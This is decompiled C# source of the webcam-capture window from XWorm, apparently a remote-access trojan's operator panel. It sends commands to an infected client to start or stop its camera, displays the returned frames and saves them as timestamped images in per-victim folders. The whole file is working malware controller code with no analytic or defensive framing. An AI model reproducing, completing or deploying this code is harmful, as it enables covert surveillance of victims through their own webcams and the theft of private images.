using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000035 RID: 53
	[DesignerGenerated]
	public partial class WebCam : Form
	{
		// Token: 0x060009A5 RID: 2469 RVA: 0x00053FD0 File Offset: 0x000521D0
		public WebCam()
		{
			base.Load += this.WebCam_Load;
			base.FormClosing += this.WebCam_FormClosing;
			this.FPS = 0;
			this.sw = Stopwatch.StartNew();
			this.InitializeComponent();
		}

		// Token: 0x17000388 RID: 904
		// (get) Token: 0x060009A8 RID: 2472 RVA: 0x00054A5B File Offset: 0x00052C5B
		// (set) Token: 0x060009A9 RID: 2473 RVA: 0x00054A68 File Offset: 0x00052C68
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000389 RID: 905
		// (get) Token: 0x060009AA RID: 2474 RVA: 0x00054AAB File Offset: 0x00052CAB
		// (set) Token: 0x060009AB RID: 2475 RVA: 0x00054AB5 File Offset: 0x00052CB5
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038A RID: 906
		// (get) Token: 0x060009AC RID: 2476 RVA: 0x00054ABE File Offset: 0x00052CBE
		// (set) Token: 0x060009AD RID: 2477 RVA: 0x00054AC8 File Offset: 0x00052CC8
		internal virtual ToolStripStatusLabel ToolStripStatusLabel4
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel4_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel4;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel4 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel4;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x1700038B RID: 907
		// (get) Token: 0x060009AE RID: 2478 RVA: 0x00054B0B File Offset: 0x00052D0B
		// (set) Token: 0x060009AF RID: 2479 RVA: 0x00054B15 File Offset: 0x00052D15
		internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038C RID: 908
		// (get) Token: 0x060009B0 RID: 2480 RVA: 0x00054B1E File Offset: 0x00052D1E
		// (set) Token: 0x060009B1 RID: 2481 RVA: 0x00054B28 File Offset: 0x00052D28
		internal virtual Guna2ComboBox Guna2ComboBox2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ComboBox2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2ComboBox2_SelectedIndexChanged);
				Guna2ComboBox guna2ComboBox = this._Guna2ComboBox2;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged -= value2;
				}
				this._Guna2ComboBox2 = value;
				guna2ComboBox = this._Guna2ComboBox2;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x1700038D RID: 909
		// (get) Token: 0x060009B2 RID: 2482 RVA: 0x00054B6B File Offset: 0x00052D6B
		// (set) Token: 0x060009B3 RID: 2483 RVA: 0x00054B78 File Offset: 0x00052D78
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x1700038E RID: 910
		// (get) Token: 0x060009B4 RID: 2484 RVA: 0x00054BBB File Offset: 0x00052DBB
		// (set) Token: 0x060009B5 RID: 2485 RVA: 0x00054BC5 File Offset: 0x00052DC5
		internal virtual Guna2ComboBox Guna2ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700038F RID: 911
		// (get) Token: 0x060009B6 RID: 2486 RVA: 0x00054BCE File Offset: 0x00052DCE
		// (set) Token: 0x060009B7 RID: 2487 RVA: 0x00054BD8 File Offset: 0x00052DD8
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000390 RID: 912
		// (get) Token: 0x060009B8 RID: 2488 RVA: 0x00054BE1 File Offset: 0x00052DE1
		// (set) Token: 0x060009B9 RID: 2489 RVA: 0x00054BEB File Offset: 0x00052DEB
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000391 RID: 913
		// (get) Token: 0x060009BA RID: 2490 RVA: 0x00054BF4 File Offset: 0x00052DF4
		// (set) Token: 0x060009BB RID: 2491 RVA: 0x00054BFE File Offset: 0x00052DFE
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000392 RID: 914
		// (get) Token: 0x060009BC RID: 2492 RVA: 0x00054C07 File Offset: 0x00052E07
		// (set) Token: 0x060009BD RID: 2493 RVA: 0x00054C11 File Offset: 0x00052E11
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x060009BE RID: 2494 RVA: 0x00054C1C File Offset: 0x00052E1C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060009BF RID: 2495 RVA: 0x00054C74 File Offset: 0x00052E74
		public void save(MemoryStream b)
		{
			try
			{
				string str = Path.Combine(Application.StartupPath, "ClientsFolder", this.CID, "WebCam");
				Image.FromStream(b).Save(str + "\\" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".jpg", ImageFormat.Jpeg);
			}
			catch (Exception ex)
			{
				this.ToolStripStatusLabel4.ForeColor = Color.Black;
			}
		}

		// Token: 0x060009C0 RID: 2496 RVA: 0x00054D04 File Offset: 0x00052F04
		private void WebCam_Load(object sender, EventArgs e)
		{
			this.Guna2ComboBox1.Text = "10%";
			this.Guna2GradientButton1.PerformClick();
		}

		// Token: 0x060009C1 RID: 2497 RVA: 0x00054D24 File Offset: 0x00052F24
		private void WebCam_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("ENDCam");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060009C2 RID: 2498 RVA: 0x00054D64 File Offset: 0x00052F64
		private void ToolStripStatusLabel4_Click(object sender, EventArgs e)
		{
			bool flag = this.ToolStripStatusLabel4.ForeColor == Color.Green;
			if (flag)
			{
				this.ToolStripStatusLabel4.ForeColor = Color.Black;
			}
			else
			{
				try
				{
					bool flag2 = this.PictureBox1.Image != null;
					if (flag2)
					{
						string text = Path.Combine(Application.StartupPath, "ClientsFolder", this.CID, "WebCam");
						bool flag3 = !Directory.Exists(text);
						if (flag3)
						{
							Directory.CreateDirectory(text);
						}
						Process.Start(text);
						this.ToolStripStatusLabel4.ForeColor = Color.Green;
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x060009C3 RID: 2499 RVA: 0x00054E34 File Offset: 0x00053034
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Start", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"Cam",
					SettingsHelper.SPL,
					this.Guna2ComboBox2.SelectedIndex.ToString(),
					SettingsHelper.SPL,
					this.Guna2ComboBox1.Text.Replace("%", "").ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				this.Guna2GradientButton1.Text = "Stop";
				this.Guna2GradientButton1.Image = Resources._Stop;
			}
			else
			{
				byte[] state2 = Helper.SB("CLOSECam");
				Client $VB$NonLocal_3 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_3.BeginSend((byte[])a0);
				}, state2);
				this.Guna2GradientButton1.Text = "Start";
				this.Guna2GradientButton1.Image = Resources.Play;
			}
		}

		// Token: 0x060009C4 RID: 2500 RVA: 0x00054F68 File Offset: 0x00053168
		private void Guna2ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("CLOSECam");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
			this.Guna2GradientButton1.Text = "Start";
			this.Guna2GradientButton1.Image = Resources.Play;
		}

		// Token: 0x04000413 RID: 1043
		public Client C;

		// Token: 0x04000414 RID: 1044
		public string CID;

		// Token: 0x04000415 RID: 1045
		public int FPS;

		// Token: 0x04000416 RID: 1046
		public Stopwatch sw;
	}
}
